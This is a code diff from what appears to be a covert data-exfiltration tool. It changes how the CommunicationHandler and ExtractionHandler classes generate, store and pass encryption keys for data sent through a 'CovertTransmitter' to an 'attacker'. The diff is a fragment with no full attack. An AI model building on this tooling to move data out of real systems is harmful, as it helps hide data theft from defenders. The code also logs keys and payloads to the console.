@@ -46,9 +46,11 @@ export class CommunicationHandler {
      */
     async initializeEncryption() {
         if (this.configuration.encryptionEnabled
-                && !this.configuration.key && !this.configuration.iv) {
-            [ this.configuration.key, this.configuration.iv ] = await DataEncoder.generateEncryption();
-            console.log('KEYS GENERATED:', this.configuration.key, this.configuration.iv);
+                && !this.key && !this.iv) {
+            [ this.key, this.configuration.key, this.iv ] = await DataEncoder.generateEncryption();
+            console.log('KEYS GENERATED:', this.key, this.iv);
+
+            this.configuration.iv = this.iv;
         }
     }
 
@@ -58,8 +60,8 @@ export class CommunicationHandler {
      */
     enabledEncryption() {
         return this.configuration.encryptionEnabled
-            && this.configuration.key instanceof CryptoKey
-            && this.configuration.iv instanceof Uint8Array;
+            && this.configuration.key
+            && this.configuration.iv;
     }
 
     /**
@@ -81,20 +83,21 @@ export class CommunicationHandler {
 
             // Event for downloading extracted data at the end of extraction.
             // Define custom event 'extractionEnded' and trigger it.
-            this.extractionEvent.dispatchEvent(new CustomEvent('extractionEnded', {
-                detail: {
-                    extractedData: this.fullData,
-                    config: this.configuration
-                }
-            }));
+
+
+            console.log('DECRYPT:', recievedData.payload, this);
+            DataEncoder.decrypt(this.fullData, this.key, this.iv).then(decryptedData => {
+                this.extractionEvent.dispatchEvent(new CustomEvent('extractionEnded', {
+                    detail: {
+                        extractedData: decryptedData,
+                        config: this.configuration
+                    }
+                }));
+            });
+ 
             this._fileBuffer = []; // empty the file buffer after ending communication.
             this.communicationEnded = true;
 
-        } else if (this.enabledEncryption()) { // 'reply' containg encrypted data
-            console.log('DECRYPT:', recievedData.payload, this);
-            DataEncoder.decrypt(recievedData.payload).then(data => {
-                this._fileBuffer.push(data);
-            });
         } else { // 'reply' containg text data
             this._fileBuffer.push(recievedData.payload);
         }
@@ -145,7 +148,7 @@ export default class ExtractionHandler extends CommunicationHandler {
      * Send data through the specified method.
      * @param {any} data - data to be sent.
      */
-    sendAll(data, attacker) {
+    async sendAll(data, attacker) {
         // If the method can loose data through the transition send the final size of sent file.
         const mandatory = [ this.configuration, this.nameOfCommunication, this.extractionEvent ];
 
@@ -154,7 +157,7 @@ export default class ExtractionHandler extends CommunicationHandler {
         console.log('send mandatory:', ...mandatory);
 
         if (this.enabledEncryption()) {
-            DataEncoder.encrypt(data).then(encryptedData => {
+            DataEncoder.encrypt(data, this.configuration.key, this.configuration.iv).then(encryptedData => {
                 const initiator = new CovertTransmitter(attacker, this.configuration,
                         this.nameOfCommunication, this.extractionEvent, encryptedData);
 
